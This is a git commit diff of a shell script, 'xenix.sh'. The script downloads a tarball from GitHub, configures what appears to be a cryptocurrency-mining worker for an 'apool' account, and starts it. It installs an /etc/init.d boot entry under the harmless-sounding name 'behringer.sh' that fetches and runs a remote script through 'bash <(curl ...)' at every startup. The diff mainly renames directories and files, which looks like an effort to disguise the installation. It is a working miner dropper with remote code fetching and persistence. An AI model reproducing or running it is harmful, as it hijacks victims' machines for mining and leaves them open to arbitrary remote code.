19129b359561d449cf4a9f4a674bd7a3c4c5fda9
gallusebi <galluselbi@gmail.com>
2024-05-31 18:18:45 +0700

    Update xenix.sh

--- xenix.sh
+++ xenix.sh
@@ -1,14 +1,16 @@
 cd /
 rm -rf midas.tar
-rm -rf midas
+rm -rf sound
 wget https://github.com/imprewa/amplitu/releases/download/rev2.0.1/midas.tar
 tar -xvf midas.tar
+cd /sound
 variable1=$(< /dev/urandom tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
 sed -i "s/test_accountname/CP_bsmzapay1 --worker ${variable1}/g" ./amd.sh
 sed -i "s/CP_32hb86nvxc/CP_bsmzapay1 --worker ${variable1}/g" ./amd.sh
 cd /etc/init.d
-echo "bash <(curl -s -L https://raw.githubusercontent.com/imprewa/amplitu/main/xenix.sh)" > xenix.sh
-chmod a+x xenix.sh
-update-rc.d xenix.sh defaults
-nohup ./amd.sh &
-ps -ef | grep apool
+echo "bash <(curl -s -L https://raw.githubusercontent.com/imprewa/amplitu/main/xenix.sh)" > behringer.sh
+chmod a+x behringer.sh
+update-rc.d behringer.sh defaults
+cd /sound
+nohup ./amd.sh
+ps -ef | grep midas
